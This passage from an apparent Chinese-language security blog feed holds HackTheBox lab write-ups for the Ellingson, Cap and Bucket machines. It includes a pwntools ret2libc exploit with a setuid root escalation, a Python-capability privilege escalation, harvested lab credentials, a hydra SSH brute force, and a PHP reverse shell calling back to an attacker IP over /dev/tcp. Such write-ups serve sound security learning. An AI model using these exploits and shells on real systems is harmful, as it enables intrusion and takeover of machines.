puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")

system_addr = libcbase + libc.sym['system']
print(f"system_addr:{hex(system_addr)}")

bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f"bin_sh_addr = {hex(bin_sh_addr)}")

ret_addr = 0x0000000000401016

payload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
p.sendline(payload2)
p.interactive()
```

ç„¶åæˆ‘ä»¬è¿è¡Œï¼Œä½†æ˜¯æƒé™åªæ˜¯ `margo`çš„æƒé™

```bash
$ $ id
uid=1002(margo) gid=1002(margo) groups=1002(margo)
```

### GetRootShell

æˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œå°†`shell`æƒé™æå‡ï¼Œå¯ä»¥ä½¿ç”¨`setuid`

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")

system_addr = libcbase + libc.sym['system']
print(f"system_addr:{hex(system_addr)}")

bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f"bin_sh_addr = {hex(bin_sh_addr)}")

ret_addr = 0x0000000000401016

setuid_addr = libcbase + libc.sym['setuid']

payload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(0) + p64(setuid_addr) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)

p.sendline(payload2)
p.interactive()
```

è¿è¡Œè·å¾— `RootShell`

```bash
(pwn) âœ  Ellingson python exp.py
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 22208
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_addr:0x7fc6c64fd9c0
libcbase:0x7fc6c647d000
system_addr:0x7fc6c64cc440
bin_sh_addr = 0x7fc6c6630e9a
[*] Switching to interactive mode

Enter access password: 
access denied.
# $ id
uid=0(root) gid=1002(margo) groups=1002(margo)
```

```bash
# $ cat /root/root.txt
d87f7aac2d13c429b8d30e11be174dd6
```

## æ€»ç»“

çˆ½ã€‚

æ‰“åˆ°ç¼“å†²åŒºæº¢å‡ºæ— ä»ä¸‹æ‰‹ï¼ŒèŠ±äº†ä¸€å¤©å¤šæ—¶é—´æ¶è¡¥`ROP` ï¼Œç„¶åä¸€å‘½é€šå…³

å¤ªçˆ½äº†ã€‚

![image.gif](/post-images/HackTheBoxMachine%20-%20Ellingson/vibePls-4x.gif)
]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackTheBox</category>
            <category>Linux</category>
            <category>PWN</category>
            <category>ret2libc</category>
            <category>Crack</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Cap]]></title>
            <link>https://www.sunsetaction.top/2025/06/11/HackTheBoxMachine - Cap</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/11/HackTheBoxMachine - Cap</guid>
            <pubDate>Wed, 11 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Cap https://app.hackthebox.com/machines/Cap | Linux | Easy å¤§åé¼é¼çš„Capï¼Œæ–°æ‰‹å…³ Recon nmapç«¯å£æ‰«æ æœ‰FTPæœåŠ¡çš„å­˜åœ¨ï¼Œæˆ‘ä»¬é¦–å…ˆæšä¸¾FTP ï¼Œä½†æ˜¯å¹¶ä¸æ”¯æŒåŒ¿åç”¨æˆ·è®¿é—® è®¿é—® HTTP ï¼Œä¸€ä¸ªåå°ç®¡ç†çš„æ¨¡æ¿ æœ‰ä¸€...]]></description>
            <content:encoded><![CDATA[
# Machine - Cap

> https://app.hackthebox.com/machines/Cap | `Linux` | `Easy`
> 

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image.png)

å¤§åé¼é¼çš„`Cap`ï¼Œæ–°æ‰‹å…³

## Recon

`nmap`ç«¯å£æ‰«æ

```bash
âœ  Cap nmap -sT -min-rate 5000 10.10.10.245    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 12:24 CST
Nmap scan report for 10.10.10.245
Host is up (0.072s latency).
Not shown: 701 closed tcp ports (conn-refused), 296 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```

```bash
âœ  Cap nmap -sT -A -p 21,22,80 10.10.10.245                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 12:24 CST
Nmap scan report for 10.10.10.245
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   110.57 ms 10.10.16.1
2   55.69 ms  10.10.10.245

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.50 seconds
```

æœ‰`FTP`æœåŠ¡çš„å­˜åœ¨ï¼Œæˆ‘ä»¬é¦–å…ˆæšä¸¾`FTP` ï¼Œä½†æ˜¯å¹¶ä¸æ”¯æŒåŒ¿åç”¨æˆ·è®¿é—®

```bash
âœ  Cap ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:root): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
```

è®¿é—® `HTTP` ï¼Œä¸€ä¸ªåå°ç®¡ç†çš„æ¨¡æ¿

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image1.png)

æœ‰ä¸€äº›å¾ˆæœ‰è¶£çš„åŠŸèƒ½

åœ¨ `/data/3` ä¸­èƒ½ä¸‹è½½ä¸€ä¸ª `pcap`æ–‡ä»¶

`/ip` èƒ½çœ‹åˆ°`ip add` å‘½ä»¤æ‰§è¡Œçš„ç»“æœ

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image2.png)

`/netstat` ä¸­èƒ½å‘ç°ç«¯å£å’Œè¿›ç¨‹ä¿¡æ¯

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image3.png)

å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„ç‚¹ `/data/x` æ˜¯ä¼šå¢åŠ çš„ï¼Œèƒ½è§‚å¯Ÿåˆ°æœ€å¤§æ˜¯åˆ°`9`

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image4.png)

## IDOR - ä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨

ä¸‹è½½çš„`pcap`æ–‡ä»¶è²Œä¼¼æ˜¯ä¸€æ®µæ—¶é—´å†…é€šè¿‡çš„æµé‡ï¼Œæˆ‘ä»¬ä¸€ç›´`ping` ï¼Œç­‰å¾…å®ƒæ›´æ–°ï¼Œæ›´æ–°åæˆ‘ä»¬å°†`pcap`æ–‡ä»¶ä¸‹è½½ä¸‹æ¥æ‰“å¼€ï¼Œèƒ½ç¡®å®šå°±æ˜¯å®ƒæ•è·çš„æµé‡

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image5.png)

å¯ä»¥å°è¯•ä¸€ç›´ä¸‹è½½ `pcap` æ–‡ä»¶ï¼Œæ•æ‰ä¸‹è½½æ—¶çš„æµé‡

```bash
âœ  Cap for i in {0..9};do curl 10.10.10.245/download/${i} --output ${i}.pcap;sleep 1;done
```

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image6.png)

å½“æˆ‘ä»¬åˆ†æåˆ°`0.pcap`æ–‡ä»¶çš„æ—¶å€™ï¼Œèƒ½å‘ç°æ•æ‰åˆ°äº†`FTP`çš„åŒ…ï¼Œè¿™åœ¨å…¶ä»–`>1.pacp`çš„æ•°æ®åŒ…ä¸­æ˜¯æ²¡æœ‰çš„

æ‰€ä»¥è¿™é‡Œå‡ºç°äº†åº”ç”¨é€»è¾‘ä¸Šçš„é”™è¯¯ï¼Œæ•æ„Ÿä¿¡æ¯æ³„éœ² (Sensitive Information Disclosure)ï¼Œä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨ (Insecure Direct Object Reference - IDOR)

å¹¶ä¸”åç«¯ä»£ç ä¸­å¯èƒ½æ˜¯ï¼š

```bash
def download_file(i):
    # å½“ i=0 æ—¶ï¼Œæœ‰ä¸€ä¸ªç‰¹æ®Šå¤„ç†ï¼Œå¯èƒ½ç”¨äºè°ƒè¯•æˆ–æµ‹è¯•
    if i == 0:
        file_path = "/var/log/debug/ftp_capture.pcap" # æŒ‡å‘äº†ä¸€ä¸ªå¼€å‘/è¿ç»´äººå‘˜ç•™ä¸‹çš„è°ƒè¯•æ–‡ä»¶
    else:
        # æ­£å¸¸é€»è¾‘
        file_path = f"/var/www/downloads/file_{i}.data"
    # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨å¹¶è¿”å›ç»™ç”¨æˆ·
    if file_exists(file_path):
        return send_file(file_path)
    else:
        return "File not found"
```

ç„¶åæˆ‘ä»¬å¾—åˆ°äº†å®ƒ

å¹¶ä¸”`FTP`æ•°æ®åŒ…ä¸­å¸¦æœ‰`nathan`ç”¨æˆ·çš„å‡­æ®ï¼Œ`nathan:Buck3tH4TF0RM3!`

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image7.png)

å‡­æ®å¯ä»¥è¿›å»åˆ° `FTP`

```bash
âœ  Cap ftp 10.10.10.245                                                                  
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:root): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||24592|)
150 Here comes the directory listing.
-rw-rw-r--    1 1001     1001          408 Jun 11 04:18 index.html
drwxr-xr-x    3 1001     1001         4096 Jun 11 04:28 snap
-r--------    1 1001     1001           33 Jun 10 19:39 user.txt
226 Directory send OK.
```

ä¹Ÿå¯ä»¥è¿›è¡Œ `SSH` ç™»å½•

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image8.png)

å½“å‰å®¶ç›®å½•ä¸‹å¯ä»¥è¯»å–`user.txt`

```bash
nathan@cap:~$ cat user.txt 
c5a3b7e60be43d07acb3580714228ee7
```

## æƒé™æå‡

è¿è¡Œ`Web`çš„`app.py` é‡Œé¢çš„ä¿¡æ¯å¾ˆæœ‰è¶£ï¼Œ`setuid(0)`

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image9.png)

ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°æ˜¯ä»¥`nathan`æƒé™è¿è¡Œçš„ï¼Œé‚£ä¹ˆ`setuid(0)` è¦æ€ä¹ˆæ‰èƒ½æœ‰æ•ˆå‘¢ï¼Ÿ

```bash
nathan@cap:/var/www/html$ ls -al
total 32
drwxr-xr-x 6 nathan nathan 4096 Jun 11 09:47 .
drwxr-xr-x 3 root   root   4096 May 23  2021 ..
drwxr-xr-x 2 nathan nathan 4096 May 27  2021 __pycache__
-rw-r--r-- 1 nathan nathan 4267 Jun 11 09:43 app.py
drwxr-xr-x 6 root   root   4096 May 23  2021 static
drwxr-xr-x 2 root   root   4096 May 23  2021 templates
drwxr-xr-x 2 root   root   4096 Jun 11 09:42 upload
```

æˆ‘ä»¬ç›´æ¥è¿è¡Œ`python` ï¼Œç›´æ¥å°±èƒ½æ‹¿åˆ° `root` æƒé™äº†

```bash
nathan@cap:/var/www/html$ python3
python3           python3-config    python3.8         python3.8-config  
nathan@cap:/var/www/html$ python3.8
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os;os.setuid(0)
>>> os.system(id)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: expected str, bytes or os.PathLike object, not builtin_function_or_method
>>> os.system('id')
uid=0(root) gid=1001(nathan) groups=1001(nathan)
0
>>> os.system('chmod +s /bin/bash')
0
```

```bash
bash-5.0# cat root.txt 
6b21801e0d9e7354cfa2de802cf89dcd
```

é€šè¿‡ `getcap` å‘½ä»¤ä¹Ÿèƒ½çŸ¥é“ä¸ºä»€ä¹ˆä¼šæœ‰è¯¥æƒé™

```bash
nathan@cap:/var/www/html$ which python3
/usr/bin/python3
nathan@cap:/var/www/html$ which python3.8
/usr/bin/python3.8
nathan@cap:/var/www/html$ getcap /usr/bin/python3
nathan@cap:/var/www/html$ getcap /usr/bin/python3.8
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackTheBox</category>
            <category>Linux</category>
            <category>Capabilities</category>
            <category>IDOR</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Bucket]]></title>
            <link>https://www.sunsetaction.top/2025/06/06/HackTheBoxMachine - Bucket</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/06/HackTheBoxMachine - Bucket</guid>
            <pubDate>Fri, 06 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Bucket https://app.hackthebox.com/machines/Bucket | Linux | Medium Recon ç«¯å£æ‰«æ è®¿é—® HTTP ä¸»é¡µä¸Šæ²¡æœ‰ä¸€ç‚¹ä¿¡æ¯ï¼Œå¯¹ç›®å½•è¿›è¡Œçˆ†ç ´ ä½†æ˜¯æˆ‘æ³¨æ„åˆ°æºä»£ç ä¸­çš„å›¾ç‰‡æ˜¯é€šè¿‡å­åŸŸåhttp://s3.bucket.ht...]]></description>
            <content:encoded><![CDATA[
# Machine - Bucket

> https://app.hackthebox.com/machines/Bucket | `Linux` | `Medium`
> 

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image.png)

## Recon

ç«¯å£æ‰«æ

```bash
âœ  Bucket nmap -sT -min-rate 5000 10.10.10.212
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:27 CST
Nmap scan report for bucket.htb (10.10.10.212)
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

```bash
âœ  Bucket nmap -sT -A -p 22,80 10.10.10.212                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:28 CST
Nmap scan report for bucket.htb (10.10.10.212)
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   108.02 ms 10.10.16.1
2   54.68 ms  bucket.htb (10.10.10.212)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.14 seconds
```

è®¿é—® `HTTP`

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image1.png)

ä¸»é¡µä¸Šæ²¡æœ‰ä¸€ç‚¹ä¿¡æ¯ï¼Œå¯¹ç›®å½•è¿›è¡Œçˆ†ç ´

```bash
âœ  Bucket feroxbuster --url http://bucket.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,403 -x php,zip,txt 
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://bucket.htb/
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ğŸ’¢  Status Code Filters   â”‚ [404, 403]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [php, zip, txt]
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[#>------------------] - 88s    46359/882180  23m     found:0       errors:37     
ğŸš¨ Caught ctrl+c ğŸš¨ saving scan state to ferox-http_bucket_htb_-1749173567.state ...
[#>------------------] - 88s    46399/882180  23m     found:0       errors:37     
[#>------------------] - 88s    46400/882180  527/s   http://bucket.htb/         
```

ä½†æ˜¯æˆ‘æ³¨æ„åˆ°æºä»£ç ä¸­çš„å›¾ç‰‡æ˜¯é€šè¿‡å­åŸŸå`http://s3.bucket.htb` ä¸­è·å–çš„

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image2.png)

å°†å…¶æ·»åŠ åˆ° `hosts`ï¼Œå¹¶è®¿é—®ï¼Œåªæ˜¾ç¤º `running`

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image3.png)

ç½‘ä¸Šæœç´¢ `s3` å¤§éƒ¨åˆ†éƒ½æ˜¯ `AWS S3` ï¼Œæ‰€ä»¥å‡å®šè¿™æ˜¯ä¸€ä¸ª `AWS S3` å®ä¾‹

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image4.png)

è·‘ä¸€ä¸‹ç›®å½•æ‰«æï¼Œèƒ½æ‰¾åˆ°ä¸¤ä¸ªå­ç›®å½•

```bash
âœBucket gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://s3.bucket.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://s3.bucket.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/health               (Status: 200) [Size: 54]
/shell                (Status: 200) [Size: 0]
/server-status        (Status: 403)
```

## AWS S3

> å…³äºAWS S3 https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/Welcome.html
> 

æ ¹æ®æ‰‹å†Œï¼Œ`adserver`æ˜¯ä¸€ä¸ªå­˜å‚¨æ¡¶ï¼Œ`images/bug.jpg` æ˜¯å¯¹è±¡é”®ï¼Œ`http://s3.bucket.htb` æ˜¯ç«¯ç‚¹

è®¿é—® `/shell` ä¼šè¢«é‡å®šå‘åˆ°ä¸€ä¸ªå¥‡æ€ªçš„`URL`ï¼Œçœ‹èµ·æ¥åªåƒæ˜¯åªæœ‰å†…ç½‘å¯ä»¥è®¿é—®

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image5.png)

è®¿é—® `/health` å‘ç°é™¤äº† s3 è¿˜è¿è¡Œç€ `dynamodb`

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image6.png)

> å…³äº Dynamodb https://docs.amazonaws.cn/amazondynamodb/latest/developerguide/Introduction.html
> 

ä»æ–‡æ¡£ä¸Šçœ‹ï¼ŒDynamodb å’Œ S3 éƒ½å¯ä»¥ä½¿ç”¨ Amazon CLI æ¥è®¿é—®ï¼Œå¹¶ä¸”ä¸¤ä¸ªåº”ç”¨éƒ½æ˜¯å¯ä»¥é›†æˆçš„

### Dynamodb

è®¿é—®`Dynamodb`å‰ï¼Œè¦å…ˆé…ç½®  `aws-cli`

PSï¼šå®˜æ–¹é…ç½®éœ€è¦ Access IDï¼Œå¹¶ä¸”æ³¨å†Œéœ€è¦ä¿¡ç”¨å¡ï¼Œä»¥ä¸ºå·®ç‚¹æ— äº†ï¼Œçœ‹äº†ä¸‹WPæ‰çŸ¥é“å¯ä»¥çå¡«

```bash
âœ  Bucket aws configure           
AWS Access Key ID [None]: sunsetaction
AWS Secret Access Key [None]: sunsetaction
Default region name [None]: CN
Default output format [None]: json
```

åˆ—å‡ºæ‰€æœ‰è¡¨

```bash
âœ  Bucket aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
{
    "TableNames": [
        "users"
    ]
}
```

æŸ¥è¯¢è¡¨çš„æ•°æ®ï¼Œå¯ä»¥å¾—åˆ°å‡ ä¸ªç”¨æˆ·å‡­æ®

```bash
âœ  Bucket aws dynamodb scan --endpoint-url http://s3.bucket.htb --table-name users
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-<_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
```

å°†å…¶æ‹¿å»å¯¹`ssh`è¿›è¡Œç¢°æ’ï¼Œä½†æ˜¯æ— ç»“æœï¼Œè²Œä¼¼ä¹Ÿèƒ½å¯¹æ•°æ®è¿›è¡Œå†™å…¥ï¼Œä½†æ˜¯ç°åœ¨ä¹Ÿæ²¡ç”¨

### æ–‡ä»¶ä¸Šä¼ 

æˆ‘ä»¬é€šè¿‡æ–‡æ¡£ https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/list-buckets.html å¯ä»¥çŸ¥é“å­˜åœ¨ `aws s3 ls` å‘½ä»¤ï¼Œè¯¥å‘½ä»¤ä½œç”¨æ˜¯å°†åœ¨å•ä¸ªéåˆ†é¡µè°ƒç”¨ä¸­åˆ—å‡ºæ‚¨è´¦æˆ·ä¸­çš„æ‰€æœ‰é€šç”¨å­˜å‚¨æ¡¶ã€‚

```bash
âœ  Bucket aws --endpoint-url http://s3.bucket.htb s3 ls
2025-06-06 15:06:03 adserver
```

å‘½ä»¤ç»“æœæ˜¯æˆ‘ä»¬å’Œ`images` åœ¨åŒä¸€ç›®å½•ä¸‹

æˆ‘ä»¬æŸ¥çœ‹å¸®åŠ©è¿˜èƒ½çœ‹åˆ° `cp` å‘½ä»¤ï¼Œé‚£ä¹ˆä»£è¡¨å¯èƒ½å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œä¸Šä¼ 

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image7.png)

æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æµ‹è¯•ä¸€ä¸‹

```bash
âœ  Bucket echo '<?php phpinfo();?>' > test.php                                                                                                                         

âœ  Bucket aws --endpoint-url http://s3.bucket.htb s3 cp test.php s3://adserver/test.php
upload: ./test.php to s3://adserver/test.php 
```

å¯ä»¥ä¸Šä¼ ï¼Œä½†æ˜¯è²Œä¼¼æ— æ³•è§£æ

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image8.png)

è¿™é‡Œçœ‹äº†ä¸‹`WP`ï¼Œä¹‹å‰è¿›è¡Œç›®å½•æ‰«æ`s3`çš„æ—¶å€™èƒ½æ‰«æåˆ°`/server-status` ï¼Œé‚£ä¹ˆè¯¥å¤„å’Œ`bucket.htb`å¯èƒ½åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œè€Œä¸”å¯ä»¥æ”¯æŒè§£æ `php` æ‹“å±•å

åœ¨ `adserver` ç›®å½•ä¸‹æ²¡æœ‰

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image9.png)

è¿™é‡Œé€šè¿‡ `ls` å‘½ä»¤æ¥æŸ¥çœ‹ `adserver`æ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨`index.html` ï¼Œé‚£ä¹ˆå¯èƒ½å°±æ˜¯ä¸»ç«™

```bash
âœ  Bucket aws --endpoint-url http://s3.bucket.htb s3 ls s3://adserver                    
                           PRE images/
2025-06-06 15:48:02       5344 index.html
```

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image10.png)

è¿›è¡Œåå¼¹ `shell`

```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.69/1234 0>&1'");?>
```

å’Œä¹‹å‰ä¸€æ ·çš„æ“ä½œå¯ä»¥ç›´æ¥è·å¾—å¼¹å›æ¥çš„ `shell`

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image11.png)

## æƒé™æå‡

### å¯†ç ç¢°æ’

å‘ç°å­˜åœ¨ç”¨æˆ·`roy`

```bash
www-data@bucket:/var/www$ ls /home
roy
```

æˆ‘ä»¬ä½¿ç”¨çš„åˆ°çš„å¯†ç è¿›è¡Œç¢°æ’

```bash
âœ  Bucket hydra -l roy  -P passwords.txt -t 12 10.10.10.212 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-06 16:13:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking ssh://10.10.10.212:22/
[22][ssh] host: 10.10.10.212   login: roy   password: n2vM-<_K_Q:.Aa2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-06 16:13:06
```

